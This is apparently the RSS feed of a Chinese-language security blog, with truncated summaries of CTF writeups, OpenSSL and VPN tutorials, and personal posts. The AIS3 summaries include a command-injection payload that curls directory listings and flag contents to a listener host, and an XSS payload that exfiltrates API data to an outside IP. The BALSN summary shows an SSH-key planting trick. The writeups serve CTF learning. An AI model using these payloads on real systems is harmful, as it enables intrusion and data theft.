<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blogs on Chumy's Blog</title><link>https://blog.chummydns.com/blogs/</link><description>Recent content in Blogs on Chumy's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 20 Feb 2025 12:00:00 +0800</lastBuildDate><atom:link href="https://blog.chummydns.com/blogs/index.xml" rel="self" type="application/rss+xml"/><item><title>AIS3 EOF 2025 Final 心得</title><link>https://blog.chummydns.com/blogs/ais3-eof-2025/</link><pubDate>Thu, 20 Feb 2025 12:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2025/</guid><description>HITCON CTF 2024 Final 心得 這波 EOF 自幹全套 A&amp;amp;D 工具兼首次實戰測試大成功，只差 ELK 沒整併進來了，但能夠把上次 HITCON CTF 的一些想法實現出來也是很不錯。
round alert 實在方便甚至跳通知比視覺化快，讓 葉東逸 跟 vincent55 可以用最快速度登入 game 完成任務。
attack manager 第一天運行的很完美，舒服的顯示哪一隊這輪有打穿，這樣就能迅速應對更新 exploit 。
pcap analysis 也是完美的將所有的流量整理好，也完美的分類每台電腦的流量，只可惜還是需要導入 elk 才能看。
patch manager 第一天壞掉所以一直修，但是好險第一天沒有太多人在 patch，當天晚上將他修好測好以後第二天就完美運行，讓 三角蛇 可以快樂追 patch。但是最可惜的是賽前 WeakGod Chiu 準備的 binary diff 沒有用到。
另外我們的超讚 crypto jeopardy 隊友 李彥佑 也是第一天就解完了超讚的。
另外第一次試著戴一台小 server 來充當 router 兼 NAS 也是一個蠻成功的，畢竟能夠內網傳檔案也不用在自己電腦接 vpn 去比賽環境還是比較方便的。
最後有些人問我為啥不用現成的，要客製化自己想要的功能直接自幹肯定是最快的對ㄅ（X
最後感謝 楊竣鴻 幫我寫前端♥️</description></item><item><title>交大碩士推甄</title><link>https://blog.chummydns.com/blogs/nycu-interview/</link><pubDate>Fri, 15 Nov 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/nycu-interview/</guid><description>交大碩士推甄 今年大四要弄推甄，由於我覺得全台灣在網路與資安的資源上最好的會是交大，然後我覺得台大投不上，我在校成績 80%，所以我就只有投交大。
書審 這次記取我過去特選寫的爛備審的教訓，這次稍微參考別人一些人的寫法用條列式把重點寫上去就好，雖說沒有甚麼美編的元素在，但是比較有重點。
備審
homelab
有利資料
推薦函 雖說規定說要兩封，但是最多能五封，那肯定是寫好寫滿。
報考組別 資工丙組 資工丁組 資工戊組 資工數據所 資安甲組 資訊聯招 網工 資工甲組 多媒體 智能系統研究所碩士班聯招 乙組 主修資安與資訊工程 丙組 主修寬頻通訊與物聯網 丁組 主修人工智慧與資通訊網路 甲組 主修人工智慧、資料科學、運算與應用 性向測驗 BJ4，直接上共筆
https://hackmd.io/@VA9Kkd2XS6emLGuTGVde0A/rktkA9Xfkl
https://codimd.nckuctf.org/60FJeMdIScqigYw5O9qpxQ
面試 公式基本上是：
自我介紹 40 秒 教授或學長開始問問題 面試的時候其實我很緊張，怕有東西不小心回答錯或回答得不好然後就被追著打。或者是問我一些沒有把握的問題，因為我記性其實沒有很好，有點怕問一些比較背的問題比如說 RFC 號碼或者是一些比較深的專有名詞之類的，但看起沒沒有。
丁組 第一天 總共兩場，每場都是大約 10 個學長圍著你面試
基本上兩邊都問我 Net 的問題，可能看我性向測驗的 Net 寫好寫滿吧？
憑印象大概是：
第一場 既然你有碰 ASN 的經驗，請問如何防止 BGP Hijacking 我寫的 SA/NA judge 相關問題 第二場 你是技能競賽資訊與網路技術的備取國手，你覺得你的弱項在哪，為何沒被選為國手 如果你比賽失利你會怎麼辦？ 你有當組長或隊長的經驗嗎？ 你怎麼發現成大沒檔 src IP 你覺得你適合丁組嗎？ 感覺第一天過得不錯。</description></item><item><title>HITCON CTF 2024 Final 心得</title><link>https://blog.chummydns.com/blogs/hitconctf-2024-final/</link><pubDate>Mon, 11 Nov 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2024-final/</guid><description>HITCON CTF 2024 Final 心得 承接 Quals 來聊聊決賽吧！
前言 這次參加 HITCON CTF Final 也算是我第一次參加這種比較大型的 CTF 決賽比賽，而我基本上負責規劃與設定整個隊伍的基礎建設，並提供機器給隊友架設並設定對內的自動化攻擊與防禦系統如 attack manager 或封包工具與攻擊重送工具。由於考慮到這場有提供 game box 且不會用到會場內網然後賽中我可能要顧 infra 加上 Ching 通靈到可能有 live CTF 所以我就在場外的飯店房間總部打比賽。
賽前準備 賽前一個月先把整個主要架構架好上好 ldap、file server、VPN 等等測試完寫好 document 然後交給 Caleb 架 attack manager 與 elk、Curious 架抓封包與重送工具，然後 Ching 架模擬環境給隊員學工具使用方式。
賽前一天 首先比賽前一天因為剛好去取貨撿到的二手 L3 switch 想說飯店如果有網路孔會很方便還能直接打 sitetosite 就扛了一台 7 公斤的東西過去，結果房間沒網路孔只有 wifi
晚上十點多規則放出來就要馬上工作當水管工把 tunnel 打通路由設通 MTU 調好然後測試，然後再應 Vincent55 與 kazma 需求把內網也串到社團內網上（外加幫隊友修網路（X）中途設到一半突然 jumpbox 斷線差點嚇死，結果看一下 DC 才發現是大家都斷掉，全部檢查完以後就等隔天。
第一天 比賽第一天剛開賽的時候發現連 scoreboard 會 403 但是 live 組連的上，因為我前一天沒有想到（或者規則沒看到） scoreboard 會鎖 ip，因為我只有設定 10.</description></item><item><title>HITCON CTF 2024 Writeup</title><link>https://blog.chummydns.com/blogs/hitconctf-2024-writeup/</link><pubDate>Tue, 16 Jul 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2024-writeup/</guid><description>hitconctf-2024-writeup 這場與 星爆吉娃娃、BambooFox、以及我們 B33f 50UP 所組成的 星爆牛炒竹狐 隊伍一起打到了世界第 24 名、台灣排名第一名，並且打進今年 HITCON CTF 決賽。
這邊就來寫一下我解的題目 writeup。
戰績 Flag Reader 目標是上傳一個帶有 flag.txt -&amp;gt; /flag.txt 的 symlink，但是 server 的 python 會用 tarfile 做一次 tarinfo 的檢查，檢查一定要是 file 且名字不能帶 flag.txt，檢查過才會用 subprocess 跑 busybox tar 去解檔。
首先我先去看tarfile 定義為 isfile 的檔案類型
REGULAR_TYPES = (REGTYPE, AREGTYPE, CONTTYPE, GNUTYPE_SPARSE) 發現 typebyte 要設成 \0、0、7、S isfile 結果才會是 true。
最一開始我注意到 S 這個東西，發現是 GNU 特有的 type 但是不知道為何我用自己 linux 測以後，發現 tarfile 會認 Sparse file 但是 tar 不知道為何還是按照一般的檔案去解，這邊可能有待研究。</description></item><item><title>OpenSSL 簽憑證教學</title><link>https://blog.chummydns.com/blogs/openssl_usage/</link><pubDate>Wed, 10 Jul 2024 11:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/openssl_usage/</guid><description>OpenSSL Generate a private key openssl genrsa -out &amp;lt;private key file&amp;gt; &amp;lt;key length general we used 2048&amp;gt; 執行結果 key 的內容 Generate a certificate request openssl req -new -key &amp;lt;private file&amp;gt; -out &amp;lt;request file&amp;gt; -addext &amp;#39;subjectAltName=&amp;lt;Alternative Name&amp;gt;&amp;#39; #addext is optional #addext 是可選項 執行結果 Self sign web certificate Init environment mkdir demoCA mkdir demoCA/newcerts mkdir demoCA/private &amp;gt; demoCA/index.txt &amp;gt; demoCA/serial echo 01 &amp;gt; demoCA/crlnumber &amp;gt; demoCA/cacert.pem cp &amp;lt;private key&amp;gt; demoCA/private/cakey.pem Modify /etc/ssl/openssl.cnf Add copy_extensions = copy at /etc/ssl/openssl.</description></item><item><title>各常見 VPN 架設簡易教學</title><link>https://blog.chummydns.com/blogs/simple-vpn-generate/</link><pubDate>Wed, 10 Jul 2024 11:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/simple-vpn-generate/</guid><description>IPsec Install strongswan apt install strongswan strongswan-pki libcharon-extra-plugins libcharon-extauth-plugins libstrongswan-extra-plugins Config file /etc/ipsec.conf for connect config /etc/ipsec.secrets A config to save your password, preshare key, private key /etc/ipsec.d/ The directorys where the certificates or private keys is placed. /etc/ipsec.d/cacerts/ for CA certificate /etc/ipsec.d/certs/ for certificate /etc/ipsec.d/private/ for private key Certificate for IPsec must have EKU: IP security IKE intermediate (oid is 1.</description></item><item><title>Google CTF 2024 WriteUp</title><link>https://blog.chummydns.com/blogs/google-ctf-2024/</link><pubDate>Mon, 24 Jun 2024 03:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/google-ctf-2024/</guid><description>Google CTF 2024 WriteUp 戰績 oneecho 概述 nc 進去是一個可以讓你下指令的 shell
然而只能下 echo 不能下其他的，目測要 command injection
到 challenge.js 來看看他怎檔的。
首先他 require 了 bash-parser
const parse = require(&amp;#39;bash-parser&amp;#39;); 接著他把指令 parse 成 ast
const ast = parse(cmd); call check 做檢查
if (!check(ast)) ( rl.write(&amp;#39;Hacker detected! No hacks, only echo!&amp;#39;); rl.close(); return; } 來看看他怎麼檢查的。
const check = ast =&amp;gt; { if (typeof(ast) === &amp;#39;string&amp;#39;) { return true; } for (var prop in ast) { if (prop === &amp;#39;type&amp;#39; &amp;amp;&amp;amp; ast[prop] === &amp;#39;Redirect&amp;#39;) { return false; } if (prop === &amp;#39;type&amp;#39; &amp;amp;&amp;amp; ast[prop] === &amp;#39;Command&amp;#39;) { if (ast[&amp;#39;name&amp;#39;] &amp;amp;&amp;amp; ast[&amp;#39;name&amp;#39;][&amp;#39;text&amp;#39;] &amp;amp;&amp;amp; ast[&amp;#39;name&amp;#39;][&amp;#39;text&amp;#39;] !</description></item><item><title>AIS3 EOF 2024 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/</link><pubDate>Mon, 08 Jan 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/</guid><description>Misc Welcome 題目 Flag AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}
Web DNS Lookup Tool: Final Webpage 解題 正常
不存在 domain
使用違規字元
讀 code 找到 blacklist
發現 $() 沒檔，測一下
過了
exploit #!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def root(): print(request.stream.read().decode()) return &amp;#34;com&amp;#34; @app.route(&amp;#39;/&amp;lt;path:data&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def run(data): print(data) return &amp;#34;com&amp;#34; if __name__ == &amp;#34;__main__&amp;#34;: app.run(host=&amp;#34;::&amp;#34;, port=80) payload curl http://10.105.0.21:21520/ -d &amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(ls /)&amp;#34;)&amp;#39; curl http://10.105.0.21:21520/ -d &amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(cat /flag_SWeUMks9hGYFciax)&amp;#34;)&amp;#39; curl http://10.</description></item><item><title>TSCCTF 2024 Official WriteUp</title><link>https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/</link><pubDate>Fri, 05 Jan 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/</guid><description>TSCCTF 2024 Official WriteUp 這次與 TSC 的夥伴們一起舉辦了一場 CTF 比賽，而我則負責 infra 的建置以及出一題 reverse 題目，雖說我似乎難度沒有控好，還在學習控難度中。
Just Shooting Game 基本上這題最大的難點有兩個：
取得 magic 值 通靈出 Transfer.exec 是某種 bytecode interpreter ，然後把解出來的 code 丟 IDA 之類的解析。 解題 這題 code 用 ILSpy 逆會比較完整，但是這邊 writeup 還是用 Dnspy 寫。
DnSpy 打開 ShootingGame_Data\Managed\Assembly-CSharp.dll 會發現有一些 Class 有一個叫 code 的 string variable 裡面塞了一坨奇怪的東西，decode 以後會發現這些都 emoji。
這些 code 會在該 Class 裡和一個叫 magic 的變數做 Transfer.etob 運算以後，跟一些參數一起跑 Transfer.exec
通過與 gun、enemy 等等 Class 比對後，發現 GameManager 是送入一個字串 Call Transfer.</description></item><item><title>BALSN 2023 WriteUp</title><link>https://blog.chummydns.com/blogs/balsn-2023-writeup/</link><pubDate>Wed, 18 Oct 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/balsn-2023-writeup/</guid><description>balsn-2023-writeup 與 B33f 50UP 戰隊一起合打的。
戰績 KShell 連到 nc kshell.balsnctf.com 7122 會有一個受限的 shell 要做逃脫，用 help 看能用的指令只有這些，沒有 pipe 沒有 redirect
裡面最複雜的應該是 ssh 所以從他開刀。思路大概是想辦法找到 自由寫檔 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。 原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 &amp;lt;username&amp;gt;@&amp;lt;hostname&amp;gt; Permission denied (publickey) 的 log。
ssh -E .ssh/authorized_keys &amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy&amp;#34;@localhost 然而在裡面測試後發現他的 ssh Permission denied 訊息沒有 username 如：Permission denied (publickey) 這就頭痛了。後來有想到用 filename。</description></item><item><title>AIS3 Pre Exam 2023 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/</link><pubDate>Tue, 23 May 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/</guid><description>Welcome 題目 解題 讀一下 pdf
E-Portfolio baby 題目 解題 網頁進來是登入介面 About 那邊可以放 html 看起來可以 XSS 測一下 看起來可以 用 flask 隨便寫個 server 聽 request
#!/usr/bin/env python3 from flask import Flask,request,redirect,Response app = Flask(__name__) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def data(): print(request.args) return &amp;#34;aaa&amp;#34; if __name__ == &amp;#34;__main__&amp;#34;: app.run(host=&amp;#34;0.0.0.0&amp;#34;,port=80) payload
&amp;lt;h5&amp;gt;Hello!&amp;lt;/h5&amp;gt; I am a &amp;lt;span style=&amp;#34;color: red;&amp;#34;&amp;gt;new&amp;lt;/span&amp;gt; user. &amp;lt;img src=x onerror=&amp;#39;fetch(&amp;#34;/api/portfolio&amp;#34;).then(res =&amp;gt; res.json()).then(data =&amp;gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})&amp;#39;/&amp;gt; 送去給 admin 然後就收到 flag 了 Flag AIS3{&amp;lt;img src=x onerror='fetch(...}
ManagementSystem 題目 解題 IDA 打開 人真好有給 shell code 每個 user 的 function 找一遍後發現 delete_user 有用 gets，可以 stack overflow，先讓他跑到 &amp;quot;Invalid index.</description></item><item><title>從 Wireshark 到 patch OpenVPN driver</title><link>https://blog.chummydns.com/blogs/openvpn-patch/</link><pubDate>Sat, 08 Apr 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/openvpn-patch/</guid><description>緣由 當初會這樣是因為接到一個很有趣的 case
簡單來說就是想要 client 可以打 VPN 到另一邊，並且讓 PPPoE 可以透過 VPN 拿到中華電信的 public IP address。
至於他們原本的架構，也是很有趣，首先會找人重架的原因是因為他們說接 VPN 後網路很不穩定，speedtest 也無法測速的那種。
於是我問了架構發現他們架構很酷。
首先他們是用那種小電腦做 server，如下圖。
而裡面長這樣。
就是他小電腦裝 windows 10，裡面只有裝 VMware，然後開兩台 windows 的 VM，一台是 windows 7 做 VPN server，裡面用 softether vpn，另一台 windows 10 我不知道用途，他們說測試用。
然後我就想這一台小電腦塞那麼多台 windows 不當才怪，再加上 softether vpn 沒架過並沒有很熟，也不確定這個效能好不好。
於是我就推薦他們 host 機可以用 Proxmox VE 做虛擬化環境，然後 VPN 的部分由於 PPPoE 是 L2 的協定，需要 ethernet header，因此 VPN 的選擇上就需要用 L2 Tunnel。關於甚麼是 L2 Tunnel 可以去看這篇文章與這篇文章。
這邊我選擇用 OpenVPN tap 作為 L2 Tunnel。</description></item><item><title>HITCON CTF 2021 Writeup</title><link>https://blog.chummydns.com/blogs/hitconctf-2022-writeup/</link><pubDate>Mon, 28 Nov 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2022-writeup/</guid><description>hitconctf-2022-writeup 戰績 checker Disassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a &amp;ldquo;hitcon&amp;rdquo; at address 0x140003000.
checker.exe:
checker_drv.sys:
Also, there are other codes that can be sent that will use the data from addresses 0x140003030 to 0x14000312F to change the function at address 0x14001B30, and then use that function to calculate the hex data from addresses 0x140003000 to 0x14000302A.</description></item><item><title>AIS3 Pre Exam 2022 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/</link><pubDate>Tue, 17 May 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/</guid><description>Score Board Welcome Welcome 題目 Flag AIS3{WTF did I just see the FLAG before CTF starts?}
Misc Excel 題目 解題 Flag AIS3{XLM_iS_to0_o1d_but_co0o0o00olll!!}
Gift in the dream 題目 解題 binwalk gift_in_the_dream.gif 一下發現啥都沒有。 strings gift_in_the_dream.gif 一下看到一堆重複出現的奇怪字串，應該是提示。 通靈一下發現應該要用 identify 把每個幀數間的間距時間抓出來應該就是 flag 了。 Script #!/bin/bash for a in $(identify -format &amp;#34;%s %T \n&amp;#34; gift_in_the_dream.gif | awk &amp;#39;{print $2}&amp;#39;) do printf &amp;#34;%02X&amp;#34; $a | xxd -r -p done Flag AIS3{5T3gn0gR4pHy_c4N_b3_fUn_s0m37iMe}
Knock 題目 解題 原本以為是 Web 題，後來想想又好像不對，request 抓出來改用 curl 跑。 curl -X POST http://chals1.</description></item><item><title>AIS3 EOF 2021 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/</link><pubDate>Sun, 16 Jan 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2021-writeup/</guid><description>leetcall 題目 限制 payload # Problem 1: Hello print(getattr(&amp;#34;Hello, {:}!&amp;#34;, &amp;#39;format&amp;#39;)(getattr(&amp;#39;!\nHello, &amp;#39;, &amp;#39;join&amp;#39;)(getattr(getattr(open(0),&amp;#39;read&amp;#39;)(),&amp;#39;splitlines&amp;#39;)()))) # Problem 2: Fibonacci print(getattr(&amp;#39;\n&amp;#39;,&amp;#39;join&amp;#39;)(map(str,map(round,map(getattr(0.4472135954999579,&amp;#39;__mul__&amp;#39;),map(getattr(1.618033988749895,&amp;#39;__pow__&amp;#39;),map(int,getattr(open(0),&amp;#39;readlines&amp;#39;)()))))))) # Problem 3: FizzBuzz getattr(&amp;#39;&amp;#39;,&amp;#39;format&amp;#39;)(setattr(__builtins__,&amp;#39;a&amp;#39;,range(1,10001)),setattr(__builtins__,&amp;#39;b&amp;#39;,list(map(bool,map(getattr(3,&amp;#39;__rmod__&amp;#39;),a)))),setattr(__builtins__,&amp;#39;c&amp;#39;,list(map(bool,map(getattr(5,&amp;#39;__rmod__&amp;#39;),a)))),print(getattr(&amp;#39;\n&amp;#39;,&amp;#39;join&amp;#39;)(map(getattr(str,&amp;#39;__add__&amp;#39;),map(getattr(str,&amp;#39;__add__&amp;#39;),map(getattr(str,&amp;#39;__mul__&amp;#39;),map(str,a),map(getattr(bool,&amp;#39;__and__&amp;#39;),b,c)),map(getattr(&amp;#39;Fizz&amp;#39;,&amp;#39;__mul__&amp;#39;),map(getattr(0,&amp;#39;__eq__&amp;#39;),b))),map(getattr(&amp;#39;Buzz&amp;#39;,&amp;#39;__mul__&amp;#39;),map(getattr(0,&amp;#39;__eq__&amp;#39;),c)))))) flag FLAG{actually_you_can_also_solve_those_leetcode_challenges_in_this_way:D}
SSRF Challenge or Not? 題目 網址 https://ssrf.h4ck3r.quest/
解題 flag FLAG{well, maybe not? XD}</description></item><item><title>BALSN 2021 WriteUp</title><link>https://blog.chummydns.com/blogs/balsn-2021-writeup/</link><pubDate>Mon, 22 Nov 2021 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/balsn-2021-writeup/</guid><description>balsn-2021-writeup 戰績 Metaeasy 題目 server code class MasterMetaClass(type): def __new__(cls, class_name, class_parents, class_attr): def getFlag(self): print(&amp;#39;Here you go, my master&amp;#39;) with open(&amp;#39;flag&amp;#39;) as f: print(f.read()) class_attr[getFlag.__name__] = getFlag attrs = ((name, value) for name, value in class_attr.items() if not name.startswith(&amp;#39;__&amp;#39;)) class_attr = dict((&amp;#39;IWant&amp;#39;+name.upper()+&amp;#39;Plz&amp;#39;, value) for name, value in attrs) newclass = super().__new__(cls, class_name, class_parents, class_attr) return newclass def __init__(*argv): print(&amp;#39;Bad guy! No Flag !!&amp;#39;) raise &amp;#39;Illegal&amp;#39; class BalsnMetaClass(type): def getFlag(self): print(&amp;#39;You\&amp;#39;re not Master!</description></item></channel></rss>